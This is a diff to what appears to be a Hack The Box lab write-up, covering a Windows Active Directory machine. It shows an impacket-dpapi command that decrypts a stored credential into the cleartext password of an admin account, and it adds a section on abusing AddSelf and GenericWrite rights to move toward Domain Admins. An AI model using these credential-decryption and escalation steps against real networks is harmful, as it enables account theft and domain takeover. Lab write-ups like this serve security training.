@@ -866,7 +866,7 @@ Decrypted key with User Key (MD4 protected)
 Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
 ```
 
-Decrypt the retrieved credential file using the decrypted key → password of `c.neri_adm` found:
+Decrypt the retrieved credential file using the decrypted key → password of `C.Neri_adm` found:
 
 ```console
 root@kali:~# impacket-dpapi credential -file /htb/C4BB96844A5C9DD45D5B6A9859252BA6 -key 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
@@ -888,3 +888,19 @@ Unknown     :
 Username    : vintage\c.neri_adm
 Unknown     : Uncr4ck4bl3P4ssW0rd0312
 ```
+
+### 4.2. Moving to `L.Bianchi_adm`
+
+Checking the `First Degree Object Control` under `Node Info` for `C.Neri_adm`:
+- `C.Neri_adm` has `AddSelf` and `GenericWrite` rights to `DelegatedAdmins`
+
+![image](https://github.com/user-attachments/assets/f25dbe1a-980a-4d5e-817e-674d013374d0)
+
+Checking the `Direct Members` under `Node Info` for `DelegatedAdmins`:
+- `L.Bianchi_adm` is a member of `DelegatedAdmins`
+
+![image](https://github.com/user-attachments/assets/3062f1e0-8e37-4359-af91-30980910edb3)
+
+And `L.Bianchi_adm` was previously noted as a member of `Domain Admins`:
+
+![image](https://github.com/user-attachments/assets/509d5d3a-7072-41ff-a59c-b42ce751cb0d)
